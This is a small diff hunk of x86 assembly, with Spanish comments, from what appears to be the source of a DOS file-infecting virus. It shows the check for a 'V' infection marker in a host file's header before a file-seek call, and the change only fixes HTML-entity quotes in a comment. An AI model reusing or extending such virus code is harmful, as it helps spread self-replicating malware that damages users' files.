@@ -543,7 +543,7 @@ check_ok:
 
     jc close_file                                    ; no se puede leer el archivo, cerrarlo
 
-    cmp byte ptr ds:[V_OFFSET + host_head + 3], 'V'  ; comparar 4to byte con la firma viral &#8216;V&#8217;
+    cmp byte ptr ds:[V_OFFSET + host_head + 3], 'V'  ; comparar 4to byte con la firma viral 'V'
     je close_file                                    ; si el archivo ya esta marcado, cerrarlo
 
     mov ah, 42h                                      ;| AH = 42h
